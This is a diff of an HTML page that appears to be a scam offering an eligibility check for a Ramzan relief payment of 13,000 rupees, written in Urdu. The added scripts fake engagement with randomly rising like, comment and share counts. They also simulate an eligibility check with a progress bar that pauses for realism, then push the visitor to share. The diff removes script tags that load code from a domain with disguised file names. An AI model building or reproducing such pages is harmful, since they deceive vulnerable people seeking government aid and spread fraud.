@@ -346,6 +346,37 @@ text-align: center;
 background-color: rgb(54, 161, 153);
 }
       </style>
+
+    <style>
+        .loading-gif {
+            max-width: 500px;
+        }
+
+        .pre-loader {
+            position: fixed;
+            z-index: 100; /** make sure this is the highest value compared to all other divs **/
+            top: 0;
+            left: 0;
+            background: #191f26;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            width: 100%;
+        }
+
+        .pre-loader.hidden {
+            animation: fadeOut 5s; /** change to 1s */
+            animation-fill-mode: forwards;
+        }
+
+        @keyframes fadeOut {
+            100% {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+    </style>
     <center>
         
         <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQ1BTiNh6EXDCSdfvslui3gtcroU9p_D-xp2UvvJ2fLEdFM0JGk8bgYFT34kQ6jOM_Gm75Plxcy3S8Jqdi0KduZT0QCoimj6sHFcvkc6B1AmlHaTEXBgGN1y4lM3EnszhXTBzMmrtpbYhrYpBHECQQDgYH67E8uYECXZtXmpbxTtGbEFkYu9hvY7rEwp2C/s955/55991685-D916-4EBB-A655-28FE423BFAAB.jpeg" alt="Free-Data" style="width: 100%;">
@@ -373,7 +404,10 @@ background-color: rgb(54, 161, 153);
             <p class="welcome">
                
 
-
+<body>
+    <div class='pre-loader'>
+    <img class='loading-gif' alt='loading' src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdhqwDmSrdMkZ6PAKG1wdsXCLLl71Q1D9yhSYoBTaSLvh2p5TkEXmDXqpzzUgv53g6Y1UnXc5JBqeGHFkuMnyBMTrXgHkL5ycvo4QU2f6EI7RHQsGDdV67SwtAKRnFrnvkHbxOOvzLMAC4iG3fgvrcDlG5YXqDRMWIPT5xm6AgHu-LR01BZ848Pqt5TdGY/s1642/2E88349A-205A-49F2-B41B-E03F3E30BA7F.gif"/>
+</div>
 
 
                 <span class="amount"><font color="#48c1b9"> پی ایم رمضان ریلیف پیکیج 2026 کی اہلیت چیک کریں (13,000 روپے) </font></span>
@@ -499,9 +533,97 @@ background-color: rgb(54, 161, 153);
     <script src="https://code.jquery.com/jquery-latest.min.js"></script>
 
 
-<script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-background-font-style.js"></script>
-<script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-bg-font-style.js"></script>
-<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-size-css.js"></script>
+
+
+    <script type="text/javascript">
+        var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+    </script>
+
+
+
+
+
+
+
+
+    <script type="text/javascript">
+        $("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+    </script>
 
 
 
@@ -523,6 +645,11 @@ background-color: rgb(54, 161, 153);
 </script>
 
 
+<script type='text/javascript'>
+    window.addEventListener('load', function () {
+        document.querySelector('.pre-loader').className += ' hidden';
+    });
+</script>
 
 
 
